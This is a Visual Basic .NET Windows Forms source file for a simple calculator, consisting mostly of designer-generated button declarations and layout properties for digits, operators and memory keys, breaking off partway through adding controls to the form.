Public Class Form1
    Inherits System.Windows.Forms.Form

#Region " Windows Form Designer generated code "

    Public Sub New()
        MyBase.New()

        'This call is required by the Windows Form Designer.
        InitializeComponent()

        'Add any initialization after the InitializeComponent() call
        period = False
        Status = False
        Memory = 0
        Temp = 0
    End Sub

    'Form overrides dispose to clean up the component list.
    Protected Overloads Overrides Sub Dispose(ByVal disposing As Boolean)
        If disposing Then
            If Not (components Is Nothing) Then
                components.Dispose()
            End If
        End If
        MyBase.Dispose(disposing)
    End Sub

    'Required by the Windows Form Designer
    Private components As System.ComponentModel.IContainer

    'NOTE: The following procedure is required by the Windows Form Designer
    'It can be modified using the Windows Form Designer.  
    'Do not modify it using the code editor.
    Friend WithEvents TextBox1 As System.Windows.Forms.TextBox
    Public WithEvents btnNumPeriod As System.Windows.Forms.Button
    Public WithEvents btn_Num_0 As System.Windows.Forms.Button
    Public WithEvents btn_Num_9 As System.Windows.Forms.Button
    Public WithEvents btn_Num_8 As System.Windows.Forms.Button
    Public WithEvents btn_Num_7 As System.Windows.Forms.Button
    Public WithEvents btn_Num_6 As System.Windows.Forms.Button
    Public WithEvents btn_Num_5 As System.Windows.Forms.Button
    Public WithEvents btn_Num_4 As System.Windows.Forms.Button
    Public WithEvents btn_Num_3 As System.Windows.Forms.Button
    Public WithEvents btn_Num_2 As System.Windows.Forms.Button
    Public WithEvents btn_Num_1 As System.Windows.Forms.Button
    Public WithEvents btn_Operator_Add As System.Windows.Forms.Button
    Public WithEvents btn_Operator_Subt As System.Windows.Forms.Button
    Public WithEvents btn_Operator_div As System.Windows.Forms.Button
    Public WithEvents btn_Operator_Multi As System.Windows.Forms.Button
    Public WithEvents btnCalculate As System.Windows.Forms.Button
    Public WithEvents btnMemoryRecall As System.Windows.Forms.Button
    Public WithEvents btnMemoryMinus As System.Windows.Forms.Button
    Public WithEvents btnMemoryPlus As System.Windows.Forms.Button
    Public WithEvents btnCLR As System.Windows.Forms.Button
    Public WithEvents btnBackspace As System.Windows.Forms.Button
    Public WithEvents btnCLR_Curr As System.Windows.Forms.Button
    Public WithEvents btnMemStatus As System.Windows.Forms.Button
    Public WithEvents btnSqrt As System.Windows.Forms.Button
    Public WithEvents btnInverse As System.Windows.Forms.Button
    Public WithEvents btnnumSign As System.Windows.Forms.Button
    Public WithEvents btnPow As System.Windows.Forms.Button
    <System.Diagnostics.DebuggerStepThrough()> Private Sub InitializeComponent()
        Dim resources As System.ComponentModel.ComponentResourceManager = New System.ComponentModel.ComponentResourceManager(GetType(Form1))
        Me.TextBox1 = New System.Windows.Forms.TextBox()
        Me.btnNumPeriod = New System.Windows.Forms.Button()
        Me.btn_Num_0 = New System.Windows.Forms.Button()
        Me.btn_Num_9 = New System.Windows.Forms.Button()
        Me.btn_Num_8 = New System.Windows.Forms.Button()
        Me.btn_Num_7 = New System.Windows.Forms.Button()
        Me.btn_Num_6 = New System.Windows.Forms.Button()
        Me.btn_Num_5 = New System.Windows.Forms.Button()
        Me.btn_Num_4 = New System.Windows.Forms.Button()
        Me.btn_Num_3 = New System.Windows.Forms.Button()
        Me.btn_Num_2 = New System.Windows.Forms.Button()
        Me.btn_Num_1 = New System.Windows.Forms.Button()
        Me.btn_Operator_Add = New System.Windows.Forms.Button()
        Me.btn_Operator_Subt = New System.Windows.Forms.Button()
        Me.btnPow = New System.Windows.Forms.Button()
        Me.btn_Operator_div = New System.Windows.Forms.Button()
        Me.btn_Operator_Multi = New System.Windows.Forms.Button()
        Me.btnCalculate = New System.Windows.Forms.Button()
        Me.btnMemoryRecall = New System.Windows.Forms.Button()
        Me.btnMemoryMinus = New System.Windows.Forms.Button()
        Me.btnMemoryPlus = New System.Windows.Forms.Button()
        Me.btnCLR = New System.Windows.Forms.Button()
        Me.btnBackspace = New System.Windows.Forms.Button()
        Me.btnCLR_Curr = New System.Windows.Forms.Button()
        Me.btnMemStatus = New System.Windows.Forms.Button()
        Me.btnSqrt = New System.Windows.Forms.Button()
        Me.btnInverse = New System.Windows.Forms.Button()
        Me.btnnumSign = New System.Windows.Forms.Button()
        Me.SuspendLayout()
        '
        'TextBox1
        '
        Me.TextBox1.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle
        Me.TextBox1.Location = New System.Drawing.Point(8, 16)
        Me.TextBox1.Name = "TextBox1"
        Me.TextBox1.ReadOnly = True
        Me.TextBox1.RightToLeft = System.Windows.Forms.RightToLeft.Yes
        Me.TextBox1.Size = New System.Drawing.Size(256, 20)
        Me.TextBox1.TabIndex = 0
        '
        'btnNumPeriod
        '
        Me.btnNumPeriod.BackColor = System.Drawing.SystemColors.Control
        Me.btnNumPeriod.Cursor = System.Windows.Forms.Cursors.Default
        Me.btnNumPeriod.FlatStyle = System.Windows.Forms.FlatStyle.Popup
        Me.btnNumPeriod.Font = New System.Drawing.Font("Verdana", 9.75!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.btnNumPeriod.ForeColor = System.Drawing.SystemColors.Highlight
        Me.btnNumPeriod.Location = New System.Drawing.Point(136, 168)
        Me.btnNumPeriod.Name = "btnNumPeriod"
        Me.btnNumPeriod.RightToLeft = System.Windows.Forms.RightToLeft.No
        Me.btnNumPeriod.Size = New System.Drawing.Size(31, 22)
        Me.btnNumPeriod.TabIndex = 40
        Me.btnNumPeriod.Text = "."
        Me.btnNumPeriod.UseVisualStyleBackColor = False
        '
        'btn_Num_0
        '
        Me.btn_Num_0.BackColor = System.Drawing.SystemColors.Control
        Me.btn_Num_0.Cursor = System.Windows.Forms.Cursors.Default
        Me.btn_Num_0.FlatStyle = System.Windows.Forms.FlatStyle.Popup
        Me.btn_Num_0.Font = New System.Drawing.Font("Verdana", 9.75!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.btn_Num_0.ForeColor = System.Drawing.Color.Blue
        Me.btn_Num_0.Location = New System.Drawing.Point(56, 168)
        Me.btn_Num_0.Name = "btn_Num_0"
        Me.btn_Num_0.RightToLeft = System.Windows.Forms.RightToLeft.No
        Me.btn_Num_0.Size = New System.Drawing.Size(31, 22)
        Me.btn_Num_0.TabIndex = 39
        Me.btn_Num_0.Text = "0"
        Me.btn_Num_0.UseVisualStyleBackColor = False
        '
        'btn_Num_9
        '
        Me.btn_Num_9.BackColor = System.Drawing.SystemColors.Control
        Me.btn_Num_9.Cursor = System.Windows.Forms.Cursors.Default
        Me.btn_Num_9.FlatStyle = System.Windows.Forms.FlatStyle.Popup
        Me.btn_Num_9.Font = New System.Drawing.Font("Verdana", 9.75!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.btn_Num_9.ForeColor = System.Drawing.Color.Blue
        Me.btn_Num_9.Location = New System.Drawing.Point(136, 96)
        Me.btn_Num_9.Name = "btn_Num_9"
        Me.btn_Num_9.RightToLeft = System.Windows.Forms.RightToLeft.No
        Me.btn_Num_9.Size = New System.Drawing.Size(31, 21)
        Me.btn_Num_9.TabIndex = 38
        Me.btn_Num_9.Text = "9"
        Me.btn_Num_9.UseVisualStyleBackColor = False
        '
        'btn_Num_8
        '
        Me.btn_Num_8.BackColor = System.Drawing.SystemColors.Control
        Me.btn_Num_8.Cursor = System.Windows.Forms.Cursors.Default
        Me.btn_Num_8.FlatStyle = System.Windows.Forms.FlatStyle.Popup
        Me.btn_Num_8.Font = New System.Drawing.Font("Verdana", 9.75!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.btn_Num_8.ForeColor = System.Drawing.Color.Blue
        Me.btn_Num_8.Location = New System.Drawing.Point(96, 96)
        Me.btn_Num_8.Name = "btn_Num_8"
        Me.btn_Num_8.RightToLeft = System.Windows.Forms.RightToLeft.No
        Me.btn_Num_8.Size = New System.Drawing.Size(31, 22)
        Me.btn_Num_8.TabIndex = 37
        Me.btn_Num_8.Text = "8"
        Me.btn_Num_8.UseVisualStyleBackColor = False
        '
        'btn_Num_7
        '
        Me.btn_Num_7.BackColor = System.Drawing.SystemColors.Control
        Me.btn_Num_7.Cursor = System.Windows.Forms.Cursors.Default
        Me.btn_Num_7.FlatStyle = System.Windows.Forms.FlatStyle.Popup
        Me.btn_Num_7.Font = New System.Drawing.Font("Verdana", 9.75!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.btn_Num_7.ForeColor = System.Drawing.Color.Blue
        Me.btn_Num_7.Location = New System.Drawing.Point(56, 96)
        Me.btn_Num_7.Name = "btn_Num_7"
        Me.btn_Num_7.RightToLeft = System.Windows.Forms.RightToLeft.No
        Me.btn_Num_7.Size = New System.Drawing.Size(31, 21)
        Me.btn_Num_7.TabIndex = 36
        Me.btn_Num_7.Text = "7"
        Me.btn_Num_7.UseVisualStyleBackColor = False
        '
        'btn_Num_6
        '
        Me.btn_Num_6.BackColor = System.Drawing.SystemColors.Control
        Me.btn_Num_6.Cursor = System.Windows.Forms.Cursors.Default
        Me.btn_Num_6.FlatStyle = System.Windows.Forms.FlatStyle.Popup
        Me.btn_Num_6.Font = New System.Drawing.Font("Verdana", 9.75!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.btn_Num_6.ForeColor = System.Drawing.Color.Blue
        Me.btn_Num_6.Location = New System.Drawing.Point(136, 120)
        Me.btn_Num_6.Name = "btn_Num_6"
        Me.btn_Num_6.RightToLeft = System.Windows.Forms.RightToLeft.No
        Me.btn_Num_6.Size = New System.Drawing.Size(31, 22)
        Me.btn_Num_6.TabIndex = 35
        Me.btn_Num_6.Text = "6"
        Me.btn_Num_6.UseVisualStyleBackColor = False
        '
        'btn_Num_5
        '
        Me.btn_Num_5.BackColor = System.Drawing.SystemColors.Control
        Me.btn_Num_5.Cursor = System.Windows.Forms.Cursors.Default
        Me.btn_Num_5.FlatStyle = System.Windows.Forms.FlatStyle.Popup
        Me.btn_Num_5.Font = New System.Drawing.Font("Verdana", 9.75!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.btn_Num_5.ForeColor = System.Drawing.Color.Blue
        Me.btn_Num_5.Location = New System.Drawing.Point(96, 120)
        Me.btn_Num_5.Name = "btn_Num_5"
        Me.btn_Num_5.RightToLeft = System.Windows.Forms.RightToLeft.No
        Me.btn_Num_5.Size = New System.Drawing.Size(31, 22)
        Me.btn_Num_5.TabIndex = 34
        Me.btn_Num_5.Text = "5"
        Me.btn_Num_5.UseVisualStyleBackColor = False
        '
        'btn_Num_4
        '
        Me.btn_Num_4.BackColor = System.Drawing.SystemColors.Control
        Me.btn_Num_4.Cursor = System.Windows.Forms.Cursors.Default
        Me.btn_Num_4.FlatStyle = System.Windows.Forms.FlatStyle.Popup
        Me.btn_Num_4.Font = New System.Drawing.Font("Verdana", 9.75!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.btn_Num_4.ForeColor = System.Drawing.Color.Blue
        Me.btn_Num_4.Location = New System.Drawing.Point(56, 120)
        Me.btn_Num_4.Name = "btn_Num_4"
        Me.btn_Num_4.RightToLeft = System.Windows.Forms.RightToLeft.No
        Me.btn_Num_4.Size = New System.Drawing.Size(31, 22)
        Me.btn_Num_4.TabIndex = 33
        Me.btn_Num_4.Text = "4"
        Me.btn_Num_4.UseVisualStyleBackColor = False
        '
        'btn_Num_3
        '
        Me.btn_Num_3.BackColor = System.Drawing.SystemColors.Control
        Me.btn_Num_3.Cursor = System.Windows.Forms.Cursors.Default
        Me.btn_Num_3.FlatStyle = System.Windows.Forms.FlatStyle.Popup
        Me.btn_Num_3.Font = New System.Drawing.Font("Verdana", 9.75!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.btn_Num_3.ForeColor = System.Drawing.Color.Blue
        Me.btn_Num_3.Location = New System.Drawing.Point(136, 144)
        Me.btn_Num_3.Name = "btn_Num_3"
        Me.btn_Num_3.RightToLeft = System.Windows.Forms.RightToLeft.No
        Me.btn_Num_3.Size = New System.Drawing.Size(31, 22)
        Me.btn_Num_3.TabIndex = 32
        Me.btn_Num_3.Text = "3"
        Me.btn_Num_3.UseVisualStyleBackColor = False
        '
        'btn_Num_2
        '
        Me.btn_Num_2.BackColor = System.Drawing.SystemColors.Control
        Me.btn_Num_2.Cursor = System.Windows.Forms.Cursors.Default
        Me.btn_Num_2.FlatStyle = System.Windows.Forms.FlatStyle.Popup
        Me.btn_Num_2.Font = New System.Drawing.Font("Verdana", 9.75!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.btn_Num_2.ForeColor = System.Drawing.Color.Blue
        Me.btn_Num_2.Location = New System.Drawing.Point(96, 144)
        Me.btn_Num_2.Name = "btn_Num_2"
        Me.btn_Num_2.RightToLeft = System.Windows.Forms.RightToLeft.No
        Me.btn_Num_2.Size = New System.Drawing.Size(31, 22)
        Me.btn_Num_2.TabIndex = 31
        Me.btn_Num_2.Text = "2"
        Me.btn_Num_2.UseVisualStyleBackColor = False
        '
        'btn_Num_1
        '
        Me.btn_Num_1.BackColor = System.Drawing.SystemColors.Control
        Me.btn_Num_1.Cursor = System.Windows.Forms.Cursors.Default
        Me.btn_Num_1.FlatStyle = System.Windows.Forms.FlatStyle.Popup
        Me.btn_Num_1.Font = New System.Drawing.Font("Verdana", 9.75!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.btn_Num_1.ForeColor = System.Drawing.Color.Blue
        Me.btn_Num_1.Location = New System.Drawing.Point(56, 144)
        Me.btn_Num_1.Name = "btn_Num_1"
        Me.btn_Num_1.RightToLeft = System.Windows.Forms.RightToLeft.No
        Me.btn_Num_1.Size = New System.Drawing.Size(31, 22)
        Me.btn_Num_1.TabIndex = 30
        Me.btn_Num_1.Text = "1"
        Me.btn_Num_1.UseVisualStyleBackColor = False
        '
        'btn_Operator_Add
        '
        Me.btn_Operator_Add.BackColor = System.Drawing.SystemColors.Control
        Me.btn_Operator_Add.Cursor = System.Windows.Forms.Cursors.Default
        Me.btn_Operator_Add.FlatStyle = System.Windows.Forms.FlatStyle.Popup
        Me.btn_Operator_Add.Font = New System.Drawing.Font("Verdana", 11.25!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.btn_Operator_Add.ForeColor = System.Drawing.Color.FromArgb(CType(CType(192, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.btn_Operator_Add.Location = New System.Drawing.Point(176, 96)
        Me.btn_Operator_Add.Name = "btn_Operator_Add"
        Me.btn_Operator_Add.RightToLeft = System.Windows.Forms.RightToLeft.No
        Me.btn_Operator_Add.Size = New System.Drawing.Size(31, 21)
        Me.btn_Operator_Add.TabIndex = 55
        Me.btn_Operator_Add.Text = "+"
        Me.btn_Operator_Add.UseVisualStyleBackColor = False
        '
        'btn_Operator_Subt
        '
        Me.btn_Operator_Subt.BackColor = System.Drawing.SystemColors.Control
        Me.btn_Operator_Subt.Cursor = System.Windows.Forms.Cursors.Default
        Me.btn_Operator_Subt.FlatStyle = System.Windows.Forms.FlatStyle.Popup
        Me.btn_Operator_Subt.Font = New System.Drawing.Font("Verdana", 11.25!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.btn_Operator_Subt.ForeColor = System.Drawing.Color.FromArgb(CType(CType(192, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.btn_Operator_Subt.Location = New System.Drawing.Point(176, 120)
        Me.btn_Operator_Subt.Name = "btn_Operator_Subt"
        Me.btn_Operator_Subt.RightToLeft = System.Windows.Forms.RightToLeft.No
        Me.btn_Operator_Subt.Size = New System.Drawing.Size(31, 22)
        Me.btn_Operator_Subt.TabIndex = 54
        Me.btn_Operator_Subt.Text = "-"
        Me.btn_Operator_Subt.UseVisualStyleBackColor = False
        '
        'btnPow
        '
        Me.btnPow.BackColor = System.Drawing.SystemColors.Control
        Me.btnPow.Cursor = System.Windows.Forms.Cursors.Default
        Me.btnPow.FlatStyle = System.Windows.Forms.FlatStyle.Popup
        Me.btnPow.Font = New System.Drawing.Font("Verdana", 9.75!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.btnPow.ForeColor = System.Drawing.SystemColors.Desktop
        Me.btnPow.Location = New System.Drawing.Point(216, 120)
        Me.btnPow.Name = "btnPow"
        Me.btnPow.RightToLeft = System.Windows.Forms.RightToLeft.No
        Me.btnPow.Size = New System.Drawing.Size(40, 22)
        Me.btnPow.TabIndex = 53
        Me.btnPow.Text = "x^"
        Me.btnPow.UseVisualStyleBackColor = False
        '
        'btn_Operator_div
        '
        Me.btn_Operator_div.BackColor = System.Drawing.SystemColors.Control
        Me.btn_Operator_div.Cursor = System.Windows.Forms.Cursors.Default
        Me.btn_Operator_div.FlatStyle = System.Windows.Forms.FlatStyle.Popup
        Me.btn_Operator_div.Font = New System.Drawing.Font("Verdana", 9.75!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.btn_Operator_div.ForeColor = System.Drawing.Color.FromArgb(CType(CType(192, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.btn_Operator_div.Location = New System.Drawing.Point(176, 168)
        Me.btn_Operator_div.Name = "btn_Operator_div"
        Me.btn_Operator_div.RightToLeft = System.Windows.Forms.RightToLeft.No
        Me.btn_Operator_div.Size = New System.Drawing.Size(31, 22)
        Me.btn_Operator_div.TabIndex = 52
        Me.btn_Operator_div.Text = "/"
        Me.btn_Operator_div.UseVisualStyleBackColor = False
        '
        'btn_Operator_Multi
        '
        Me.btn_Operator_Multi.BackColor = System.Drawing.SystemColors.Control
        Me.btn_Operator_Multi.Cursor = System.Windows.Forms.Cursors.Default
        Me.btn_Operator_Multi.FlatStyle = System.Windows.Forms.FlatStyle.Popup
        Me.btn_Operator_Multi.Font = New System.Drawing.Font("Verdana", 9.75!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.btn_Operator_Multi.ForeColor = System.Drawing.Color.FromArgb(CType(CType(192, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.btn_Operator_Multi.Location = New System.Drawing.Point(176, 144)
        Me.btn_Operator_Multi.Name = "btn_Operator_Multi"
        Me.btn_Operator_Multi.RightToLeft = System.Windows.Forms.RightToLeft.No
        Me.btn_Operator_Multi.Size = New System.Drawing.Size(31, 22)
        Me.btn_Operator_Multi.TabIndex = 51
        Me.btn_Operator_Multi.Text = "x"
        Me.btn_Operator_Multi.TextAlign = System.Drawing.ContentAlignment.BottomCenter
        Me.btn_Operator_Multi.UseVisualStyleBackColor = False
        '
        'btnCalculate
        '
        Me.btnCalculate.BackColor = System.Drawing.SystemColors.Control
        Me.btnCalculate.Cursor = System.Windows.Forms.Cursors.Default
        Me.btnCalculate.FlatStyle = System.Windows.Forms.FlatStyle.Popup
        Me.btnCalculate.Font = New System.Drawing.Font("Verdana", 11.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.btnCalculate.ForeColor = System.Drawing.Color.FromArgb(CType(CType(192, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.btnCalculate.Location = New System.Drawing.Point(216, 168)
        Me.btnCalculate.Name = "btnCalculate"
        Me.btnCalculate.RightToLeft = System.Windows.Forms.RightToLeft.No
        Me.btnCalculate.Size = New System.Drawing.Size(40, 21)
        Me.btnCalculate.TabIndex = 50
        Me.btnCalculate.Text = "="
        Me.btnCalculate.UseVisualStyleBackColor = False
        '
        'btnMemoryRecall
        '
        Me.btnMemoryRecall.BackColor = System.Drawing.SystemColors.Control
        Me.btnMemoryRecall.Cursor = System.Windows.Forms.Cursors.Default
        Me.btnMemoryRecall.FlatStyle = System.Windows.Forms.FlatStyle.Popup
        Me.btnMemoryRecall.Font = New System.Drawing.Font("Verdana", 9.75!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.btnMemoryRecall.ForeColor = System.Drawing.Color.FromArgb(CType(CType(192, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.btnMemoryRecall.Location = New System.Drawing.Point(8, 96)
        Me.btnMemoryRecall.Name = "btnMemoryRecall"
        Me.btnMemoryRecall.RightToLeft = System.Windows.Forms.RightToLeft.No
        Me.btnMemoryRecall.Size = New System.Drawing.Size(36, 24)
        Me.btnMemoryRecall.TabIndex = 61
        Me.btnMemoryRecall.Text = "MR"
        Me.btnMemoryRecall.UseVisualStyleBackColor = False
        '
        'btnMemoryMinus
        '
        Me.btnMemoryMinus.BackColor = System.Drawing.SystemColors.Control
        Me.btnMemoryMinus.Cursor = System.Windows.Forms.Cursors.Default
        Me.btnMemoryMinus.FlatStyle = System.Windows.Forms.FlatStyle.Popup
        Me.btnMemoryMinus.Font = New System.Drawing.Font("Verdana", 9.75!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.btnMemoryMinus.ForeColor = System.Drawing.Color.FromArgb(CType(CType(192, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.btnMemoryMinus.Location = New System.Drawing.Point(8, 168)
        Me.btnMemoryMinus.Name = "btnMemoryMinus"
        Me.btnMemoryMinus.RightToLeft = System.Windows.Forms.RightToLeft.No
        Me.btnMemoryMinus.Size = New System.Drawing.Size(36, 24)
        Me.btnMemoryMinus.TabIndex = 60
        Me.btnMemoryMinus.Text = "M-"
        Me.btnMemoryMinus.UseVisualStyleBackColor = False
        '
        'btnMemoryPlus
        '
        Me.btnMemoryPlus.BackColor = System.Drawing.SystemColors.Control
        Me.btnMemoryPlus.Cursor = System.Windows.Forms.Cursors.Default
        Me.btnMemoryPlus.FlatStyle = System.Windows.Forms.FlatStyle.Popup
        Me.btnMemoryPlus.Font = New System.Drawing.Font("Verdana", 9.75!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.btnMemoryPlus.ForeColor = System.Drawing.Color.FromArgb(CType(CType(192, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.btnMemoryPlus.Location = New System.Drawing.Point(8, 132)
        Me.btnMemoryPlus.Name = "btnMemoryPlus"
        Me.btnMemoryPlus.RightToLeft = System.Windows.Forms.RightToLeft.No
        Me.btnMemoryPlus.Size = New System.Drawing.Size(36, 22)
        Me.btnMemoryPlus.TabIndex = 59
        Me.btnMemoryPlus.Text = "M+"
        Me.btnMemoryPlus.UseVisualStyleBackColor = False
        '
        'btnCLR
        '
        Me.btnCLR.BackColor = System.Drawing.SystemColors.Control
        Me.btnCLR.Cursor = System.Windows.Forms.Cursors.Default
        Me.btnCLR.FlatStyle = System.Windows.Forms.FlatStyle.Popup
        Me.btnCLR.Font = New System.Drawing.Font("Verdana", 9.75!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.btnCLR.ForeColor = System.Drawing.Color.FromArgb(CType(CType(192, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.btnCLR.Location = New System.Drawing.Point(200, 56)
        Me.btnCLR.Name = "btnCLR"
        Me.btnCLR.RightToLeft = System.Windows.Forms.RightToLeft.No
        Me.btnCLR.Size = New System.Drawing.Size(56, 22)
        Me.btnCLR.TabIndex = 58
        Me.btnCLR.Text = "C"
        Me.btnCLR.UseVisualStyleBackColor = False
        '
        'btnBackspace
        '
        Me.btnBackspace.BackColor = System.Drawing.SystemColors.Control
        Me.btnBackspace.Cursor = System.Windows.Forms.Cursors.Default
        Me.btnBackspace.FlatStyle = System.Windows.Forms.FlatStyle.Popup
        Me.btnBackspace.Font = New System.Drawing.Font("Verdana", 8.25!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.btnBackspace.ForeColor = System.Drawing.Color.FromArgb(CType(CType(192, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.btnBackspace.Location = New System.Drawing.Point(56, 56)
        Me.btnBackspace.Name = "btnBackspace"
        Me.btnBackspace.RightToLeft = System.Windows.Forms.RightToLeft.No
        Me.btnBackspace.Size = New System.Drawing.Size(80, 22)
        Me.btnBackspace.TabIndex = 57
        Me.btnBackspace.Text = "Backspace"
        Me.btnBackspace.UseVisualStyleBackColor = False
        '
        'btnCLR_Curr
        '
        Me.btnCLR_Curr.BackColor = System.Drawing.SystemColors.Control
        Me.btnCLR_Curr.Cursor = System.Windows.Forms.Cursors.Default
        Me.btnCLR_Curr.FlatStyle = System.Windows.Forms.FlatStyle.Popup
        Me.btnCLR_Curr.Font = New System.Drawing.Font("Verdana", 9.75!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.btnCLR_Curr.ForeColor = System.Drawing.Color.FromArgb(CType(CType(192, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.btnCLR_Curr.Location = New System.Drawing.Point(144, 56)
        Me.btnCLR_Curr.Name = "btnCLR_Curr"
        Me.btnCLR_Curr.RightToLeft = System.Windows.Forms.RightToLeft.No
        Me.btnCLR_Curr.Size = New System.Drawing.Size(48, 22)
        Me.btnCLR_Curr.TabIndex = 56
        Me.btnCLR_Curr.Text = "CE"
        Me.btnCLR_Curr.UseVisualStyleBackColor = False
        '
        'btnMemStatus
        '
        Me.btnMemStatus.BackColor = System.Drawing.SystemColors.Control
        Me.btnMemStatus.Cursor = System.Windows.Forms.Cursors.Default
        Me.btnMemStatus.Enabled = False
        Me.btnMemStatus.FlatStyle = System.Windows.Forms.FlatStyle.Popup
        Me.btnMemStatus.Font = New System.Drawing.Font("Verdana", 9.75!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.btnMemStatus.ForeColor = System.Drawing.Color.DarkOliveGreen
        Me.btnMemStatus.Location = New System.Drawing.Point(8, 56)
        Me.btnMemStatus.Name = "btnMemStatus"
        Me.btnMemStatus.RightToLeft = System.Windows.Forms.RightToLeft.No
        Me.btnMemStatus.Size = New System.Drawing.Size(36, 32)
        Me.btnMemStatus.TabIndex = 62
        Me.btnMemStatus.UseVisualStyleBackColor = False
        '
        'btnSqrt
        '
        Me.btnSqrt.BackColor = System.Drawing.SystemColors.Control
        Me.btnSqrt.Cursor = System.Windows.Forms.Cursors.Default
        Me.btnSqrt.FlatStyle = System.Windows.Forms.FlatStyle.Popup
        Me.btnSqrt.Font = New System.Drawing.Font("Verdana", 8.25!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.btnSqrt.ForeColor = System.Drawing.SystemColors.Desktop
        Me.btnSqrt.Location = New System.Drawing.Point(216, 96)
        Me.btnSqrt.Name = "btnSqrt"
        Me.btnSqrt.RightToLeft = System.Windows.Forms.RightToLeft.No
        Me.btnSqrt.Size = New System.Drawing.Size(40, 22)
        Me.btnSqrt.TabIndex = 63
        Me.btnSqrt.Text = "sqrt"
        Me.btnSqrt.UseVisualStyleBackColor = False
        '
        'btnInverse
        '
        Me.btnInverse.BackColor = System.Drawing.SystemColors.Control
        Me.btnInverse.Cursor = System.Windows.Forms.Cursors.Default
        Me.btnInverse.FlatStyle = System.Windows.Forms.FlatStyle.Popup
        Me.btnInverse.Font = New System.Drawing.Font("Verdana", 9.75!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.btnInverse.ForeColor = System.Drawing.SystemColors.Desktop
        Me.btnInverse.Location = New System.Drawing.Point(216, 144)
        Me.btnInverse.Name = "btnInverse"
        Me.btnInverse.RightToLeft = System.Windows.Forms.RightToLeft.No
        Me.btnInverse.Size = New System.Drawing.Size(40, 22)
        Me.btnInverse.TabIndex = 64
        Me.btnInverse.Text = "1/x"
        Me.btnInverse.UseVisualStyleBackColor = False
        '
        'btnnumSign
        '
        Me.btnnumSign.BackColor = System.Drawing.SystemColors.Control
        Me.btnnumSign.Cursor = System.Windows.Forms.Cursors.Default
        Me.btnnumSign.FlatStyle = System.Windows.Forms.FlatStyle.Popup
        Me.btnnumSign.Font = New System.Drawing.Font("Verdana", 6.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.btnnumSign.ForeColor = System.Drawing.Color.Blue
        Me.btnnumSign.Location = New System.Drawing.Point(96, 168)
        Me.btnnumSign.Name = "btnnumSign"
        Me.btnnumSign.RightToLeft = System.Windows.Forms.RightToLeft.No
        Me.btnnumSign.Size = New System.Drawing.Size(31, 22)
        Me.btnnumSign.TabIndex = 65
        Me.btnnumSign.Text = "+/-"
        Me.btnnumSign.UseVisualStyleBackColor = False
        '
        'Form1
        '
        Me.AutoScaleBaseSize = New System.Drawing.Size(6, 13)
        Me.ClientSize = New System.Drawing.Size(272, 201)
        Me.Controls.Add(Me.btnnumSign)
        Me.Controls.Add(Me.btnInverse)
        Me.Controls.Add(Me.btnSqrt)
        Me.Controls.Add(Me.btnMemStatus)
        Me.Controls.Add(Me.btnMemoryRecall)
        Me.Controls.Add(Me.btnMemoryMinus)
        Me.Controls.Add(Me.btnMemoryPlus)
        Me.Controls.Add(Me.btnCLR)
        Me.Controls.Add(Me.btnBackspace)
